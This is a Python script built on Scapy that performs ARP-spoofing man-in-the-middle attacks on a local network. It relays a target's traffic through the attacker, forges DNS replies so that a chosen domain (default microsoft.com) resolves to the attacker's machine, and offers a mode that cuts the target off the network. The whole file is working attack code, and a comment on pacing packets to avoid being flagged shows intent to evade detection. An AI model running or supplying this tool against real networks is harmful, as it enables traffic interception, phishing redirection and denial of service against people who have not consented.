from scapy.all import ARP, Ether, send,srp,sniff,Packet,Raw,DNSQR,DNSRR,\
IP,ICMP,UDP,TCP,DNS
from scapy.all import *
import time
import sys
import threading
from scapy.arch.windows import get_windows_if_list
my_ip=socket.gethostbyname(socket.gethostname())

spoof_url="microsoft.com" #if spoof mode is chosen, this is the url that will get spoofed, change this
# TODO: why not get this as a command line argument?

mac_of_target={}

def get_mac(ip):
    """Returns MAC address of an IP in the network"""
    if sys.argv[3]=='t':return 'ff:ff:ff:ff:ff:ff'
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    response = srp(arp_request_broadcast,verbose=False)[0]

    return response[0][1].hwsrc if response else None

def spoof(target_ip, spoof_ip,target_mac):
    """Sends a spoofed ARP response to target IP, associating attacker's MAC with spoofed IP"""
    

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)
    packet2 = ARP(op=2, pdst=spoof_ip, hwdst=target_mac, psrc=my_ip)
    send(packet2, verbose=False)

def sendPacket(pkt):
    if Ether in pkt and IP in pkt:
        eth = pkt[Ether]
        ip = pkt[IP]

        # Packet from client -> forward to router
        if eth.src == mac_of_target["target"] and ip.dst != Ether().src:
            new_pkt = pkt.copy()
            new_pkt[Ether].src = Ether().src
            new_pkt[Ether].dst = mac_of_target["gateway"]

            # Fix checksums
            del new_pkt[IP].chksum
            if TCP in new_pkt:
                del new_pkt[TCP].chksum
            if UDP in new_pkt:
                del new_pkt[UDP].chksum

            sendp(new_pkt,verbose=0)

        # Packet from router -> forward to client
        elif eth.src == mac_of_target["gateway"]:
            new_pkt = pkt.copy()
            new_pkt[Ether].src = Ether().src
            new_pkt[Ether].dst = mac_of_target["target"]

            # Fix checksums
            del new_pkt[IP].chksum
            if TCP in new_pkt:
                del new_pkt[TCP].chksum
            if UDP in new_pkt:
                del new_pkt[UDP].chksum

            #may need to increase TTL

            sendp(new_pkt, verbose=0)
    

def process(p:Packet):
    
    try:
        url=''
        if p.haslayer(DNS):
            if p[IP].dst==my_ip:return
            url=p[DNSQR].qname.decode()
            if url==f"{spoof_url}.": #url must end with .
                print("Found target url")
                answer = IP(dst=p[IP].src,src=p[IP].dst)/UDP(dport=p[UDP].sport,sport=53)/\
                    DNS(id=p[DNS].id,
                        an=DNSRR(rrname=p[DNSQR].qname,rdata=my_ip,ttl=300),
                        qd=DNSQR(qname=p[DNSQR].qname),
                        qr=1,aa=1)
                
        try:
            if (url==f"{spoof_url}."):
                send(answer,verbose=0)
            else:
                sendThread=threading.Thread(target=sendPacket,args=(p,),daemon=True) #so nothing is blockeg
                sendThread.start()
        except:...
    except Exception as e:...

def restore(target_ip, spoof_ip):
    """Restores the original ARP table by sending the correct ARP packets"""
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    
    if not target_mac or not spoof_mac:
        return

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=4, verbose=False)


def start_sniff():
    print("sniff started")
    sniff(prn=process)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target_ip> <gateway_ip> <mode:spoof-s|turnoff-t>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    mac_of_target["target"]=get_mac(target_ip) if sys.argv[3]=='s' else None
    mac_of_target["gateway"]=get_mac(gateway_ip)

    try:
        print("[*] Starting ARP spoofing...")
        my_mac=Ether().src
        mac_of_target["mine"]=my_mac

        t=threading.Thread(target=start_sniff,daemon=True)
        t.start() if sys.argv[3] == 's' else None
        print(f"mac: {my_mac}, starting sniff...")

        while True:
            spoof(target_ip, gateway_ip,'aa:aa:aa:aa:aa:aa' if sys.argv[3]=='t' else my_mac) #if we want to 'turn off' the network, we refer everyone to a nonexistant mac
            spoof(gateway_ip, target_ip,my_mac) if sys.argv[3]=='s' else None # Tell gateway that we are the target
            
            time.sleep(1) #if we go too fast many devices will flag us
    except KeyboardInterrupt:
        print("\n[!] Restoring network, please wait...")
        try:
            restore(target_ip, gateway_ip)
            restore(gateway_ip, target_ip)
        except:...
        print("[+] ARP tables restored. Exiting.")
        #t.join() maybe we shouldnt do that
        os._exit(1)
        
